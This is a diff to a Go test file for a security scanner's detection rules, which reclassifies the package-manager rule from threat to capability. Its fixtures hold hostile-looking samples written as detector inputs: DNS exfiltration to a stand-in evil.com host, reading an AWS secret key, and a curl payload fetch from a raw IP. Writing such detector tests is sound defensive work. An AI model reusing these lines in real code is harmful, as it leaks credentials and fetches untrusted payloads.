@@ -40,7 +40,9 @@ var corePositives = []fixture{
 	{"char-codes", "obf.js", `var s = String.fromCharCode(104, 105); socket.gethostbyname(payload);`},
 	{"dns-ops", "resolve.py", `socket.gethostbyname("data." + payload + ".evil.com")`},
 	{"env-access-sensitive", "conf.py", `AWS_SECRET = os.environ["AWS_SECRET_ACCESS_KEY"]`},
-	{"package-manager", "setup.sh", `pip install requests`},
+	// package-manager is a capability now, so the fixture needs a threat to
+	// pair with. socket.gethostbyname trips dns-ops, which remains a threat.
+	{"package-manager", "setup.sh", "pip install requests\nsocket.gethostbyname(payload)"},
 	{"time-trigger", "bomb.py", `time.sleep(86400)`},
 	{"dynamic-import", "load.py", `mod = __import__("os")`},
 	{"suspicious-network", "beacon.sh", `curl http://185.220.101.5/payload`},
@@ -174,6 +176,7 @@ var coreNegatives = []fixture{
 	// Demoted to capability: the trigger alone must now be suppressed.
 	{"non-ascii", "lone.txt", "caf" + accentedE},
 	{"char-codes", "lone.js", `var s = String.fromCharCode(104, 105);`},
+	{"package-manager", "lone.sh", `pip install requests`},
 
 	// Agent rules are scoped to agent paths; the same content in ordinary
 	// project files must not fire.
